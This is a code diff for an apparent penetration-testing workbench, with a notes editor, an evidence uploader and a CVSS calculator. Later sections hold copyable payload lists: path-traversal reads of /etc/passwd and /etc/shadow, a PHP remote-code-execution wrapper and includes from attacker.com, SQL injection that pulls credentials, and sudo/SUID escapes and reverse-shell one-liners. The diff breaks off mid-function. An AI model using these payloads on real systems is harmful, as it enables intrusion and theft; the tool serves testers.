+    document.getElementById('note-finding').value = note.finding_id || '';
+    document.getElementById('note-autosave-status').textContent = '';
+    // Show edit mode
+    document.getElementById('note-content').classList.remove('hidden');
+    document.getElementById('note-preview').classList.add('hidden');
+    document.getElementById('note-preview-toggle').innerHTML = '<i class="fa-solid fa-eye mr-1"></i>Preview';
+}
+
+function onNoteEdit() {
+    clearTimeout(noteAutoSaveTimer);
+    document.getElementById('note-autosave-status').textContent = 'Unsaved changes...';
+    noteAutoSaveTimer = setTimeout(() => { saveCurrentNote(); }, 2000);
+}
+
+function saveCurrentNote() {
+    if (!activeNoteId) return;
+    const note = notesData.find(n => n.id === activeNoteId);
+    if (!note) return;
+    note.title = document.getElementById('note-title').value;
+    note.content = document.getElementById('note-content').value;
+    note.target_id = document.getElementById('note-target').value;
+    note.finding_id = document.getElementById('note-finding').value;
+    note.updated = new Date().toISOString();
+    saveNotesToStorage();
+    document.getElementById('note-autosave-status').textContent = 'Saved';
+    renderNotesList();
+}
+
+function deleteNote() {
+    if (!activeNoteId || !confirm('Delete this note?')) return;
+    notesData = notesData.filter(n => n.id !== activeNoteId);
+    saveNotesToStorage();
+    activeNoteId = null;
+    document.getElementById('notes-editor').classList.add('hidden');
+    document.getElementById('notes-editor-empty').classList.remove('hidden');
+    renderNotesList();
+}
+
+function saveNotesToStorage() {
+    localStorage.setItem('spectra_notes', JSON.stringify(notesData));
+}
+
+function wrapNoteText(before, after) {
+    const ta = document.getElementById('note-content');
+    const start = ta.selectionStart, end = ta.selectionEnd;
+    const text = ta.value;
+    const selected = text.substring(start, end) || 'text';
+    ta.value = text.substring(0, start) + before + selected + after + text.substring(end);
+    ta.selectionStart = start + before.length;
+    ta.selectionEnd = start + before.length + selected.length;
+    ta.focus();
+    onNoteEdit();
+}
+
+function toggleNotePreview() {
+    const content = document.getElementById('note-content');
+    const preview = document.getElementById('note-preview');
+    const toggle = document.getElementById('note-preview-toggle');
+    if (content.classList.contains('hidden')) {
+        content.classList.remove('hidden');
+        preview.classList.add('hidden');
+        toggle.innerHTML = '<i class="fa-solid fa-eye mr-1"></i>Preview';
+    } else {
+        content.classList.add('hidden');
+        preview.classList.remove('hidden');
+        toggle.innerHTML = '<i class="fa-solid fa-pen mr-1"></i>Edit';
+        preview.innerHTML = renderMarkdown(content.value);
+    }
+}
+
+function renderMarkdown(text) {
+    return escapeHtml(text)
+        .replace(/^### (.+)$/gm, '<h3 class="text-base font-bold text-white mt-2 mb-1">$1</h3>')
+        .replace(/^## (.+)$/gm, '<h2 class="text-lg font-bold text-white mt-3 mb-1">$1</h2>')
+        .replace(/^# (.+)$/gm, '<h1 class="text-xl font-bold text-white mt-4 mb-2">$1</h1>')
+        .replace(/\*\*(.+?)\*\*/g, '<strong class="text-white">$1</strong>')
+        .replace(/\*(.+?)\*/g, '<em>$1</em>')
+        .replace(/`(.+?)`/g, '<code class="px-1 py-0.5 bg-black/30 rounded text-violet-300 text-xs font-mono">$1</code>')
+        .replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2" class="text-violet-400 underline" target="_blank">$1</a>')
+        .replace(/^- (.+)$/gm, '<li class="ml-4 list-disc">$1</li>')
+        .replace(/\n/g, '<br>');
+}
+
+// ========== EVIDENCE ==========
+let evidenceFiles = JSON.parse(localStorage.getItem('spectra_evidence') || '[]');
+
+function loadEvidence() { renderEvidenceGrid(); }
+
+function renderEvidenceGrid() {
+    const findingFilter = document.getElementById('evidence-finding-filter')?.value || '';
+    let filtered = evidenceFiles;
+    if (findingFilter) filtered = filtered.filter(e => e.finding_id === findingFilter);
+
+    const grid = document.getElementById('evidence-grid');
+    if (!filtered.length) {
+        grid.innerHTML = '<div class="text-slate-500 text-sm text-center py-8 col-span-full">No evidence files yet. Upload or paste screenshots.</div>';
+        return;
+    }
+    grid.innerHTML = filtered.map((e, i) => {
+        const isImage = /\.(png|jpg|jpeg|gif|webp|svg)$/i.test(e.name) || e.type?.startsWith('image/');
+        const thumb = isImage && e.dataUrl
+            ? `<img src="${e.dataUrl}" class="w-full h-32 object-cover rounded-t-lg" alt="${escapeHtml(e.name)}">`
+            : `<div class="w-full h-32 flex items-center justify-center bg-slate-800 rounded-t-lg"><i class="fa-solid fa-file text-3xl text-slate-500"></i></div>`;
+        const size = e.size ? formatFileSize(e.size) : '-';
+        const ago = e.uploaded ? timeAgo(new Date(e.uploaded)) : '';
+        return `<div class="evidence-card rounded-lg bg-slate-800/50 cursor-pointer" onclick="previewEvidence(${i})">
+            ${thumb}
+            <div class="p-2">
+                <div class="text-xs text-white truncate">${escapeHtml(e.name)}</div>
+                <div class="text-[10px] text-slate-500">${size} - ${ago}</div>
+            </div>
+            <button onclick="event.stopPropagation();removeEvidence(${i})" class="absolute top-1 right-1 w-5 h-5 bg-black/50 hover:bg-rose-600 text-white rounded-full text-[10px] flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity"><i class="fa-solid fa-xmark"></i></button>
+        </div>`;
+    }).join('');
+}
+
+function uploadEvidence(input) {
+    Array.from(input.files).forEach(file => {
+        const reader = new FileReader();
+        reader.onload = () => {
+            evidenceFiles.push({ name: file.name, type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
+            localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
+            renderEvidenceGrid();
+        };
+        reader.readAsDataURL(file);
+    });
+    input.value = '';
+}
+
+async function pasteEvidence() {
+    try {
+        const items = await navigator.clipboard.read();
+        for (const item of items) {
+            for (const type of item.types) {
+                if (type.startsWith('image/')) {
+                    const blob = await item.getType(type);
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        const name = 'clipboard-' + Date.now() + '.' + type.split('/')[1];
+                        evidenceFiles.push({ name, type, size: blob.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
+                        localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
+                        renderEvidenceGrid();
+                    };
+                    reader.readAsDataURL(blob);
+                }
+            }
+        }
+    } catch (e) { console.debug('Clipboard read failed:', e); }
+}
+
+function initEvidenceDragDrop() {
+    const dropzone = document.getElementById('evidence-dropzone');
+    const panel = document.getElementById('panel-evidence');
+    if (!panel) return;
+    panel.addEventListener('dragenter', (e) => { e.preventDefault(); dropzone.classList.remove('hidden'); dropzone.classList.add('dragover'); });
+    dropzone.addEventListener('dragleave', () => { dropzone.classList.add('hidden'); dropzone.classList.remove('dragover'); });
+    dropzone.addEventListener('dragover', (e) => e.preventDefault());
+    dropzone.addEventListener('drop', (e) => {
+        e.preventDefault();
+        dropzone.classList.add('hidden');
+        dropzone.classList.remove('dragover');
+        Array.from(e.dataTransfer.files).forEach(file => {
+            const reader = new FileReader();
+            reader.onload = () => {
+                evidenceFiles.push({ name: file.name, type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
+                localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
+                renderEvidenceGrid();
+            };
+            reader.readAsDataURL(file);
+        });
+    });
+}
+
+function initClipboardPaste() {
+    document.addEventListener('paste', (e) => {
+        const panel = document.getElementById('panel-evidence');
+        if (panel && !panel.classList.contains('hidden') && e.clipboardData?.files?.length) {
+            e.preventDefault();
+            Array.from(e.clipboardData.files).forEach(file => {
+                if (!file.type.startsWith('image/')) return;
+                const reader = new FileReader();
+                reader.onload = () => {
+                    evidenceFiles.push({ name: 'paste-' + Date.now() + '.png', type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
+                    localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
+                    renderEvidenceGrid();
+                };
+                reader.readAsDataURL(file);
+            });
+        }
+    });
+}
+
+function previewEvidence(idx) {
+    const e = evidenceFiles[idx];
+    if (!e) return;
+    const isImage = /\.(png|jpg|jpeg|gif|webp|svg)$/i.test(e.name) || e.type?.startsWith('image/');
+    const content = isImage
+        ? `<img src="${e.dataUrl}" class="max-w-full max-h-[70vh] mx-auto block p-4">`
+        : `<div class="p-8 text-center"><i class="fa-solid fa-file text-4xl text-slate-500 mb-3"></i><p class="text-slate-300">${escapeHtml(e.name)}</p><a href="${e.dataUrl}" download="${escapeHtml(e.name)}" class="mt-3 inline-block px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white rounded-lg text-sm transition-colors">Download</a></div>`;
+    showModal(e.name, content, 'max-w-4xl');
+}
+
+function removeEvidence(idx) {
+    if (!confirm('Delete this evidence file?')) return;
+    evidenceFiles.splice(idx, 1);
+    localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
+    renderEvidenceGrid();
+}
+
+function filterEvidence() { renderEvidenceGrid(); }
+
+function formatFileSize(bytes) {
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / 1048576).toFixed(1) + ' MB';
+}
+
+function timeAgo(date) {
+    const s = Math.floor((Date.now() - date.getTime()) / 1000);
+    if (s < 60) return s + 's ago';
+    if (s < 3600) return Math.floor(s / 60) + 'm ago';
+    if (s < 86400) return Math.floor(s / 3600) + 'h ago';
+    return Math.floor(s / 86400) + 'd ago';
+}
+
+// ========== CVSS 3.1 CALCULATOR ==========
+const cvssState = {};
+const CVSS_WEIGHTS = {
+    AV: {N:0.85,A:0.62,L:0.55,P:0.20},
+    AC: {L:0.77,H:0.44},
+    PR: {U:{N:0.85,L:0.62,H:0.27}, C:{N:0.85,L:0.68,H:0.50}},
+    UI: {N:0.85,R:0.62},
+    C:  {N:0,L:0.22,H:0.56},
+    I:  {N:0,L:0.22,H:0.56},
+    A:  {N:0,L:0.22,H:0.56},
+};
+
+function setCVSS(btn) {
+    const group = btn.parentElement;
+    const metric = group.dataset.cvss;
+    const val = btn.dataset.val;
+    group.querySelectorAll('.cvss-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    cvssState[metric] = val;
+    calculateCVSS();
+}
+
+function calculateCVSS() {
+    const required = ['AV','AC','PR','UI','S','C','I','A'];
+    if (!required.every(m => cvssState[m])) {
+        document.getElementById('cvss-score').textContent = '-';
+        document.getElementById('cvss-severity').textContent = 'Select all metrics';
+        document.getElementById('cvss-severity').className = 'text-sm font-bold mt-1 px-3 py-1 rounded inline-block text-slate-400';
+        return;
+    }
+
+    const scopeChanged = cvssState.S === 'C';
+    const av = CVSS_WEIGHTS.AV[cvssState.AV];
+    const ac = CVSS_WEIGHTS.AC[cvssState.AC];
+    const pr = CVSS_WEIGHTS.PR[scopeChanged ? 'C' : 'U'][cvssState.PR];
+    const ui = CVSS_WEIGHTS.UI[cvssState.UI];
+    const c = CVSS_WEIGHTS.C[cvssState.C];
+    const i = CVSS_WEIGHTS.I[cvssState.I];
+    const a = CVSS_WEIGHTS.A[cvssState.A];
+
+    const iss = 1 - ((1 - c) * (1 - i) * (1 - a));
+    let impact;
+    if (scopeChanged) {
+        impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
+    } else {
+        impact = 6.42 * iss;
+    }
+
+    if (impact <= 0) {
+        updateCVSSDisplay(0);
+        return;
+    }
+
+    const exploitability = 8.22 * av * ac * pr * ui;
+    let score;
+    if (scopeChanged) {
+        score = Math.min(1.08 * (impact + exploitability), 10);
+    } else {
+        score = Math.min(impact + exploitability, 10);
+    }
+    score = Math.ceil(score * 10) / 10;
+    updateCVSSDisplay(score);
+}
+
+function updateCVSSDisplay(score) {
+    document.getElementById('cvss-score').textContent = score.toFixed(1);
+    let severity, color, barColor;
+    if (score === 0) { severity = 'NONE'; color = 'text-slate-400 bg-slate-500/10'; barColor = '#64748b'; }
+    else if (score < 4) { severity = 'LOW'; color = 'text-emerald-400 bg-emerald-500/10'; barColor = '#34d399'; }
+    else if (score < 7) { severity = 'MEDIUM'; color = 'text-amber-400 bg-amber-500/10'; barColor = '#fbbf24'; }
+    else if (score < 9) { severity = 'HIGH'; color = 'text-orange-400 bg-orange-500/10'; barColor = '#fb923c'; }
+    else { severity = 'CRITICAL'; color = 'text-rose-400 bg-rose-500/10'; barColor = '#f43f5e'; }
+
+    document.getElementById('cvss-severity').textContent = severity;
+    document.getElementById('cvss-severity').className = 'text-sm font-bold mt-1 px-3 py-1 rounded inline-block ' + color;
+    document.getElementById('cvss-bar').style.width = (score * 10) + '%';
+    document.getElementById('cvss-bar').style.background = barColor;
+
+    const vector = 'CVSS:3.1/AV:' + (cvssState.AV||'?') + '/AC:' + (cvssState.AC||'?') + '/PR:' + (cvssState.PR||'?') +
+        '/UI:' + (cvssState.UI||'?') + '/S:' + (cvssState.S||'?') + '/C:' + (cvssState.C||'?') + '/I:' + (cvssState.I||'?') + '/A:' + (cvssState.A||'?');
+    document.getElementById('cvss-vector-display').textContent = vector;
+}
+
+function copyCVSSVector() {
+    const v = document.getElementById('cvss-vector-display').textContent;
+    navigator.clipboard.writeText(v);
+}
+
+function parseCVSSVector() {
+    const input = document.getElementById('cvss-vector-input').value.trim();
+    const match = input.match(/CVSS:3\.[01]\/AV:([NALP])\/AC:([LH])\/PR:([NLH])\/UI:([NR])\/S:([UC])\/C:([NLH])\/I:([NLH])\/A:([NLH])/);
+    if (!match) { alert('Invalid CVSS vector string'); return; }
+    const [, av, ac, pr, ui, s, c, i, a] = match;
+    const vals = {AV:av, AC:ac, PR:pr, UI:ui, S:s, C:c, I:i, A:a};
+    Object.entries(vals).forEach(([metric, val]) => {
+        const group = document.querySelector(`[data-cvss="${metric}"]`);
+        if (!group) return;
+        group.querySelectorAll('.cvss-btn').forEach(b => {
+            b.classList.toggle('active', b.dataset.val === val);
+        });
+        cvssState[metric] = val;
+    });
+    calculateCVSS();
+}
+
+// ========== LFI/RFI PAYLOADS ==========
+const LFI_PAYLOADS = [
+    {cat:'Basic LFI', os:'linux', payload:'../../../etc/passwd', desc:'Read passwd file'},
+    {cat:'Basic LFI', os:'linux', payload:'../../../etc/shadow', desc:'Read shadow file (need root)'},
+    {cat:'Basic LFI', os:'linux', payload:'../../../etc/hosts', desc:'Read hosts file'},
+    {cat:'Basic LFI', os:'linux', payload:'../../../proc/self/environ', desc:'Process environment variables'},
+    {cat:'Basic LFI', os:'linux', payload:'../../../proc/self/cmdline', desc:'Process command line'},
+    {cat:'Basic LFI', os:'linux', payload:'../../../var/log/auth.log', desc:'Auth logs (log poisoning)'},
+    {cat:'Basic LFI', os:'linux', payload:'../../../var/log/apache2/access.log', desc:'Apache access log'},
+    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', desc:'Windows hosts file'},
+    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\win.ini', desc:'Windows ini file'},
+    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\system.ini', desc:'System ini file'},
+    {cat:'Null Byte', os:'linux', payload:'../../../etc/passwd%00', desc:'Null byte bypass (PHP < 5.3)'},
+    {cat:'Null Byte', os:'linux', payload:'../../../etc/passwd%00.png', desc:'Null byte with extension'},
+    {cat:'Double Encoding', os:'linux', payload:'..%252f..%252f..%252fetc/passwd', desc:'Double URL encode ../'},
+    {cat:'Double Encoding', os:'linux', payload:'%252e%252e%252f%252e%252e%252fetc/passwd', desc:'Full double encode'},
+    {cat:'Filter Bypass', os:'linux', payload:'....//....//....//etc/passwd', desc:'Double dot bypass'},
+    {cat:'Filter Bypass', os:'linux', payload:'..;/..;/..;/etc/passwd', desc:'Semicolon bypass (Tomcat)'},
+    {cat:'Filter Bypass', os:'linux', payload:'/..\\..\\..\\etc/passwd', desc:'Backslash bypass'},
+    {cat:'PHP Wrappers', os:'linux', payload:'php://filter/convert.base64-encode/resource=index.php', desc:'Read PHP source (base64)'},
+    {cat:'PHP Wrappers', os:'linux', payload:'php://input', desc:'PHP input stream (POST data exec)'},
+    {cat:'PHP Wrappers', os:'linux', payload:'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+', desc:'Data wrapper RCE'},
+    {cat:'PHP Wrappers', os:'linux', payload:'expect://id', desc:'Expect wrapper (if enabled)'},
+    {cat:'RFI', os:'linux', payload:'http://attacker.com/shell.txt', desc:'Basic RFI'},
+    {cat:'RFI', os:'linux', payload:'http://attacker.com/shell.txt%00', desc:'RFI with null byte'},
+    {cat:'RFI', os:'linux', payload:'\\\\attacker.com\\share\\shell.php', desc:'UNC path RFI (Windows)'},
+];
+let lfiOSFilter = 'all';
+
+function initLFI() { renderLFI(); }
+
+function renderLFI() {
+    const search = (document.getElementById('lfi-search')?.value || '').toLowerCase();
+    let filtered = LFI_PAYLOADS;
+    if (lfiOSFilter !== 'all') filtered = filtered.filter(p => p.os === lfiOSFilter);
+    if (search) filtered = filtered.filter(p => p.payload.toLowerCase().includes(search) || p.desc.toLowerCase().includes(search) || p.cat.toLowerCase().includes(search));
+
+    let currentCat = '';
+    let html = '';
+    filtered.forEach(p => {
+        if (p.cat !== currentCat) {
+            currentCat = p.cat;
+            html += `<div class="text-[10px] font-bold uppercase text-slate-500 mt-3 mb-1">${escapeHtml(currentCat)}</div>`;
+        }
+        const osColor = p.os === 'linux' ? 'text-emerald-400' : 'text-blue-400';
+        html += `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs cursor-pointer" onclick="navigator.clipboard.writeText('${escapeAttr(p.payload)}')">
+            <span class="${osColor} text-[10px] uppercase w-12 shrink-0">${p.os}</span>
+            <code class="text-violet-300 font-mono flex-1 truncate">${escapeHtml(p.payload)}</code>
+            <span class="text-slate-500 text-[10px] shrink-0 truncate max-w-[150px]">${escapeHtml(p.desc)}</span>
+            <span class="copy-btn text-slate-400 text-[10px]"><i class="fa-solid fa-copy"></i></span>
+        </div>`;
+    });
+    document.getElementById('lfi-list').innerHTML = html || '<div class="text-slate-500 text-xs py-4 text-center">No payloads found</div>';
+}
+
+function filterLFI() { renderLFI(); }
+function filterLFIOS(os) {
+    lfiOSFilter = os;
+    document.querySelectorAll('.lfi-os-btn').forEach(b => {
+        b.className = b.dataset.os === os ? 'lfi-os-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'lfi-os-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
+    });
+    renderLFI();
+}
+
+// ========== SQL INJECTION PAYLOADS ==========
+const SQLI_PAYLOADS = [
+    {cat:'Detection', payload:"' OR '1'='1", desc:'Basic OR true'},
+    {cat:'Detection', payload:"' OR '1'='1'--", desc:'OR true with comment'},
+    {cat:'Detection', payload:"' OR 1=1#", desc:'OR true MySQL comment'},
+    {cat:'Detection', payload:"1' ORDER BY 1--+", desc:'Column count detection'},
+    {cat:'Detection', payload:"' AND 1=1--", desc:'Boolean true test'},
+    {cat:'Detection', payload:"' AND 1=2--", desc:'Boolean false test'},
+    {cat:'Detection', payload:"' AND SLEEP(5)--", desc:'Time-based blind test'},
+    {cat:'UNION', payload:"' UNION SELECT NULL--", desc:'UNION 1 column'},
+    {cat:'UNION', payload:"' UNION SELECT NULL,NULL--", desc:'UNION 2 columns'},
+    {cat:'UNION', payload:"' UNION SELECT NULL,NULL,NULL--", desc:'UNION 3 columns'},
+    {cat:'UNION', payload:"' UNION SELECT username,password FROM users--", desc:'Extract credentials'},
+    {cat:'UNION', payload:"' UNION SELECT table_name,NULL FROM information_schema.tables--", desc:'List tables'},
+    {cat:'UNION', payload:"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc:'List columns'},
+    {cat:'Blind', payload:"' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--", desc:'Char-by-char extraction'},
+    {cat:'Blind', payload:"' AND IF(1=1,SLEEP(5),0)--", desc:'MySQL time-based'},
+    {cat:'Blind', payload:"'; WAITFOR DELAY '0:0:5'--", desc:'MSSQL time-based'},
+    {cat:'Error-based', payload:"' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))--", desc:'MySQL error-based'},
+    {cat:'Error-based', payload:"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", desc:'MSSQL error-based'},
+    {cat:'Error-based', payload:"' AND 1=CAST((SELECT version()) AS int)--", desc:'PostgreSQL error-based'},
+    {cat:'WAF Bypass', payload:"/*!50000UNION*//*!50000SELECT*/1,2,3", desc:'MySQL version comment'},
+    {cat:'WAF Bypass', payload:"' UNI/**/ON SEL/**/ECT 1,2,3--", desc:'Inline comment bypass'},
+    {cat:'WAF Bypass', payload:"' %55nion %53elect 1,2,3--", desc:'URL-encoded keywords'},
+    {cat:'WAF Bypass', payload:"' uNiOn aLl sElEcT 1,2,3--", desc:'Case variation'},
+    {cat:'WAF Bypass', payload:"' || '1'='1", desc:'OR alternative syntax'},
+];
+const SQLI_CATEGORIES = ['All','Detection','UNION','Blind','Error-based','WAF Bypass'];
+let sqliCatFilter = 'All';
+
+function initSQLi() {
+    document.getElementById('sqli-cat-filters').innerHTML = SQLI_CATEGORIES.map(c =>
+        `<button class="sqli-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${c === 'All' ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 border border-white/5'}" data-cat="${c}" onclick="filterSQLiCat('${c}')">${c}</button>`
+    ).join('');
+    renderSQLi();
+}
+
+function renderSQLi() {
+    const search = (document.getElementById('sqli-search')?.value || '').toLowerCase();
+    let filtered = SQLI_PAYLOADS;
+    if (sqliCatFilter !== 'All') filtered = filtered.filter(p => p.cat === sqliCatFilter);
+    if (search) filtered = filtered.filter(p => p.payload.toLowerCase().includes(search) || p.desc.toLowerCase().includes(search));
+
+    let currentCat = '';
+    let html = '';
+    filtered.forEach(p => {
+        if (p.cat !== currentCat) { currentCat = p.cat; html += `<div class="text-[10px] font-bold uppercase text-slate-500 mt-3 mb-1">${escapeHtml(currentCat)}</div>`; }
+        html += `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs cursor-pointer" onclick="navigator.clipboard.writeText(this.querySelector('code').textContent)">
+            <code class="text-rose-300 font-mono flex-1 truncate">${escapeHtml(p.payload)}</code>
+            <span class="text-slate-500 text-[10px] shrink-0 truncate max-w-[200px]">${escapeHtml(p.desc)}</span>
+            <span class="copy-btn text-slate-400 text-[10px]"><i class="fa-solid fa-copy"></i></span>
+        </div>`;
+    });
+    document.getElementById('sqli-list').innerHTML = html || '<div class="text-slate-500 text-xs py-4 text-center">No payloads found</div>';
+}
+
+function filterSQLi() { renderSQLi(); }
+function filterSQLiCat(cat) {
+    sqliCatFilter = cat;
+    document.querySelectorAll('.sqli-cat-btn').forEach(b => {
+        b.className = b.dataset.cat === cat ? 'sqli-cat-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'sqli-cat-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
+    });
+    renderSQLi();
+}
+
+// ========== PRIVILEGE ESCALATION (GTFOBins) ==========
+const GTFOBINS = [
+    {bin:'python3', fns:['shell','suid','sudo','file-read','reverse-shell'], cmds:{shell:"python3 -c 'import os; os.system(\"/bin/sh\")'", suid:"python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'", sudo:"sudo python3 -c 'import os; os.system(\"/bin/sh\")'", 'file-read':"python3 -c 'print(open(\"FILE\").read())'", 'reverse-shell':"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"}},
+    {bin:'perl', fns:['shell','sudo','reverse-shell'], cmds:{shell:"perl -e 'exec \"/bin/sh\";'", sudo:"sudo perl -e 'exec \"/bin/sh\";'", 'reverse-shell':"perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"}},
+    {bin:'find', fns:['shell','suid','sudo'], cmds:{shell:"find . -exec /bin/sh -p \\; -quit", suid:"find / -perm -4000 -exec /bin/sh -p \\; -quit", sudo:"sudo find . -exec /bin/sh \\; -quit"}},
+    {bin:'vim', fns:['shell','suid','sudo','file-read','file-write'], cmds:{shell:"vim -c ':!/bin/sh'", suid:"vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"sh\")'", sudo:"sudo vim -c ':!/bin/sh'", 'file-read':"vim FILE", 'file-write':"vim FILE (then :w)"}},
+    {bin:'nmap', fns:['shell','sudo'], cmds:{shell:"nmap --interactive\\nnmap> !sh", sudo:"sudo nmap --interactive\\nnmap> !sh"}},
+    {bin:'awk', fns:['shell','suid','sudo','file-read'], cmds:{shell:"awk 'BEGIN {system(\"/bin/sh\")}'", suid:"awk 'BEGIN {system(\"/bin/sh -p\")}'", sudo:"sudo awk 'BEGIN {system(\"/bin/sh\")}'", 'file-read':"awk '{print}' FILE"}},
+    {bin:'less', fns:['shell','sudo','file-read'], cmds:{shell:"less /etc/passwd\\n!/bin/sh", sudo:"sudo less /etc/passwd\\n!/bin/sh", 'file-read':"less FILE"}},
+    {bin:'more', fns:['shell','sudo','file-read'], cmds:{shell:"more /etc/passwd\\n!/bin/sh", sudo:"sudo more /etc/passwd\\n!/bin/sh", 'file-read':"TERM= more FILE"}},
+    {bin:'tar', fns:['shell','sudo'], cmds:{shell:"tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", sudo:"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}},
+    {bin:'bash', fns:['shell','suid','sudo'], cmds:{shell:"/bin/bash", suid:"bash -p", sudo:"sudo bash"}},
+    {bin:'cp', fns:['suid','sudo','file-write'], cmds:{suid:"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p", sudo:"sudo cp /etc/shadow /tmp/shadow", 'file-write':"cp PAYLOAD TARGET"}},
+    {bin:'chmod', fns:['suid','sudo'], cmds:{suid:"chmod +s /bin/bash", sudo:"sudo chmod +s /bin/bash"}},
+    {bin:'env', fns:['shell','sudo'], cmds:{shell:"env /bin/sh", sudo:"sudo env /bin/sh"}},
+    {bin:'node', fns:['shell','sudo','reverse-shell'], cmds:{shell:"node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"],{stdio:[0,1,2]})'", sudo:"sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'", 'reverse-shell':"node -e '(function(){var c=require(\"child_process\").spawn(\"/bin/sh\",[]);var s=require(\"net\").connect(PORT,\"IP\",function(){c.stdin.pipe(s);s.pipe(c.stdout);s.pipe(c.stderr)})})();'"}},
+    {bin:'php', fns:['shell','sudo','file-read','reverse-shell'], cmds:{shell:"php -r 'system(\"/bin/sh\");'", sudo:"sudo php -r 'system(\"/bin/sh\");'", 'file-read':"php -r 'echo file_get_contents(\"FILE\");'", 'reverse-shell':"php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"}},
+    {bin:'ruby', fns:['shell','sudo','reverse-shell'], cmds:{shell:"ruby -e 'exec \"/bin/sh\"'", sudo:"sudo ruby -e 'exec \"/bin/sh\"'", 'reverse-shell':"ruby -rsocket -e 'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"}},
+    {bin:'wget', fns:['file-write'], cmds:{'file-write':"wget http://attacker.com/payload -O /target/path"}},
+    {bin:'curl', fns:['file-read','file-write'], cmds:{'file-read':"curl file:///etc/passwd", 'file-write':"curl http://attacker.com/payload -o /target/path"}},
+];
+const PRIVESC_FUNCTIONS = ['All','shell','suid','sudo','file-read','file-write','reverse-shell'];
+let privescFnFilter = 'All';
+
+function initPrivEsc() {
+    document.getElementById('privesc-fn-filters').innerHTML = PRIVESC_FUNCTIONS.map(f =>
+        `<button class="privesc-fn-btn px-2 py-1 rounded text-[11px] transition-colors ${f === 'All' ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 border border-white/5'}" data-fn="${f}" onclick="filterPrivEscFn('${f}')">${f === 'All' ? 'All' : f.charAt(0).toUpperCase() + f.slice(1).replace('-',' ')}</button>`
+    ).join('');
+    renderPrivEsc();
+}
+
+function renderPrivEsc() {
+    const search = (document.getElementById('privesc-search')?.value || '').toLowerCase();
+    let filtered = GTFOBINS;
+    if (privescFnFilter !== 'All') filtered = filtered.filter(b => b.fns.includes(privescFnFilter));
+    if (search) filtered = filtered.filter(b => b.bin.toLowerCase().includes(search));
+
+    document.getElementById('privesc-list').innerHTML = filtered.map(b => {
+        const fnBadges = b.fns.map(f => {
+            const colors = {shell:'bg-emerald-500/20 text-emerald-400', suid:'bg-rose-500/20 text-rose-400', sudo:'bg-amber-500/20 text-amber-400', 'file-read':'bg-blue-500/20 text-blue-400', 'file-write':'bg-violet-500/20 text-violet-400', 'reverse-shell':'bg-pink-500/20 text-pink-400'};
+            return `<span class="px-1.5 py-0.5 rounded text-[9px] ${colors[f] || 'bg-slate-500/20 text-slate-400'}">${f}</span>`;
+        }).join('');
+        const cmds = Object.entries(b.cmds).map(([fn, cmd]) =>
+            `<div class="mt-1"><span class="text-[9px] text-slate-500 uppercase">${fn}:</span>
+            <div class="flex items-center gap-1 mt-0.5"><code class="text-[11px] text-violet-300 font-mono bg-black/30 rounded px-1.5 py-0.5 flex-1 truncate">${escapeHtml(cmd)}</code>
